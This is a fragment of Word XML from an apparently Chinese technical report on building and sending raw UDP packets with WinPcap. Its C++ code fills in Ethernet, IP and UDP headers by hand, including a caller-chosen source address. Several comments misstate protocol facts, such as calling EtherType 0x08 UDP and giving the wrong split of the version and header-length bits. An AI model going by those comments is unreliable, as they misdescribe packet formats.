        <w:tab/>
        <w:t>printf(" (ERROR_NOT_FOUND)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9975CE" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63494FB4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>default:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E838D80" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf("\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D82A8F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE59F97" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0628566D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return FALSE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54883CBB" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491085C8" w14:textId="2FC88A2A" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00DA1C50">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42469581" w14:textId="5B69EF9D"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1124" w:name="_Toc482141262"/>
      <w:bookmarkStart w:id="1125" w:name="_Toc482141935"/>
      <w:bookmarkStart w:id="1126" w:name="_Toc482522655"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>数据包的构建</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1124"/>
      <w:bookmarkEnd w:id="1125"/>
      <w:bookmarkEnd w:id="1126"/>
    </w:p>
    <w:p w14:paraId="28E24823" w14:textId="0C0B31B2" w:rsidR="00D51734" w:rsidRDefault="009E1F57" w:rsidP="009E1F57">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pP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BF62B21" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>void RawPacket::CreatePacket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE13E3E" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>(unsigned char* SourceMAC,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451DC5A3" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned char* DestinationMAC,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2233D476" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned int   SourceIP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396A68F7" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>unsigned int   DestIP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4249AB1D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned short SourcePort,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F365A25" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned short DestinationPort,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032CF26B" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned char* UserData,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5CB674" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>unsigned int   UserDataLen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D07A33" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ECE33F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>RawPacket::UserDataLen = UserDataLen;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD6D74D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">FinalPacket = new unsigned char[UserDataLen + 42]; // Reserve enough memory for the length of the data plus 42 bytes of headers </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200EA900" w14:textId="77777777" w:rsidR="00D51734" w:rsidRPr="000F5F92" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT TotalLen = UserDataLen + 20 + 8; // IP Header uses length of data plus length of ip header (usually 20 bytes) plus lenght of udp header (usually 8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D761A92" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//Beginning of Ethernet II Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E64E5E" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)FinalPacket, (void*)DestinationMAC, 6);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C596BC1" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 6), (void*)SourceMAC, 6);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D878B66" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT TmpType = 8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FBC269" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//USHORT TmpType = 0x8864;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5E27CF" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 12), (void*)&amp;TmpType, 2); //The type of protocol used. (USHORT) Type 0x08 is UDP. You can change this for other protocols (e.g. TCP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432A1F18" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41F7AEF7" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56000C00" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>// Beginning of IP Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD946C6" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 14), (void*)"\x45", 1); //The Version (4) in the first 3 bits  and the header length on the last 5. (Im not sure, if someone could correct me plz do)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7CED8C" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">//If you wanna do any IPv6 stuff, you will need to change this. but i still don't know how to do ipv6 myself =s </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB208F9" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 15), (void*)"\x00", 1); //Differntiated services </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">field. Usually 0 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0F0EA0" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(TotalLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B0E59E" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 16), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1565C1E8" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(0x1337);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCC9D25" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 18), (void*)&amp;TmpType, 2);// Identification. Usually not needed to be anything specific, esp in udp. 2 bytes (Here it is 0x1337</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B599A9" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 20), (void*)"\x00", 1); // Flags. These are not usually used in UDP either, more used in TCP for fragmentation and syn acks i think </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D4E71A" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 21), (void*)"\x00", 1); // Offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB289EA" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 22), (void*)"\x80", 1); // Time to live. Determines the amount of time the packet can spend trying to get to the other computer. (I see 128 used often for this)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E61BC0F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 23), (void*)"\x11", 1);// Protocol. UDP is 0x11 (17) TCP is 6 ICMP is 1 etc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3678746D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">memcpy((void*)(FinalPacket + 24), (void*)"\x00\x00", 2); //checksum </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46173F81" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 26), (void*)&amp;SourceIP, 4); //inet_addr does htonl() for us</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EC23C4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 30), (void*)&amp;DestIP, 4);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7224B8E4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//Beginning of UDP Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D606DB" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(SourcePort);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED1B521" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 34), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1EAE52" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>TmpType = htons(DestinationPort);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A125908" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 36), (void*)&amp;TmpType, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEE4831" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>USHORT UDPTotalLen = htons(UserDataLen + 8); // UDP Length does not include length of IP header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C547A28" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 38), (void*)&amp;UDPTotalLen, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FDF4233" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//memcpy((void*)(FinalPacket+40),(void*)&amp;TmpType,2); //checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FB670F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 42), (void*)UserData, UserDataLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AD7DB2" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>unsigned short UDPChecksum = CalculateUDPChecksum(UserData, UserDataLen, SourceIP, DestIP, htons(SourcePort), htons(DestinationPort), 0x11);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BBE7F0" w14:textId="77777777" w:rsidR="00D51734" w:rsidRPr="000F5F92" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 40), (void*)&amp;UDPChecksum, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBDA699" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>unsigned short IPChecksum = htons(CalculateIPChecksum(TotalLen, 0x1337, SourceIP, DestIP));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAD0F33" w14:textId="77777777" w:rsidR="00D51734" w:rsidRPr="000F5F92" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memcpy((void*)(FinalPacket + 24), (void*)&amp;IPChecksum, 2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462D0CA4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5493E5C0" w14:textId="30BCC582" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2467C86E" w14:textId="2854D753" w:rsidR="00D51734" w:rsidRPr="008776FD" w:rsidRDefault="00D51734" w:rsidP="00D51734">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3C80F196" w14:textId="586A6D8B" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1127" w:name="_Toc482141263"/>
      <w:bookmarkStart w:id="1128" w:name="_Toc482141936"/>
      <w:bookmarkStart w:id="1129" w:name="_Toc482522656"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>数据包的发送</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1127"/>
      <w:bookmarkEnd w:id="1128"/>
      <w:bookmarkEnd w:id="1129"/>
    </w:p>
    <w:p w14:paraId="0238D557" w14:textId="77777777" w:rsidR="00EE696E" w:rsidRDefault="00EE696E" w:rsidP="00EE696E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）调用</w:t>
      </w:r>
      <w:r>
        <w:t>pcap_open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数打开网卡</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C0E83A" w14:textId="586891F6" w:rsidR="00D51734" w:rsidRDefault="00EE696E" w:rsidP="00EE696E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）调用</w:t>
      </w:r>
      <w:r>
        <w:t>pcap_sendpacket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数发送组建好的数据包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3899BFA7" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5A478D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>char Error[256];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B77DCEB" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_t* t;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1062DE0B" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>t = pcap_open(Device-&gt;name, 65535, PCAP_OPENFLAG_DATATX_UDP, 1, NULL, Error);//FP for send</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BED0817" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/*pcap_sendpacket(t, FinalPacket, UserDataLen + 42);*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5C27C2" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pcap_sendpacket(t, FinalPacket, UserDataLen + 42) == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6E094D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6167C848" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; "send success\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657B4EEA" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468F6244" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B99CD4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC2277D" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>cout &lt;&lt; "send error\n";</w:t>
      </w:r>
    </w:p>
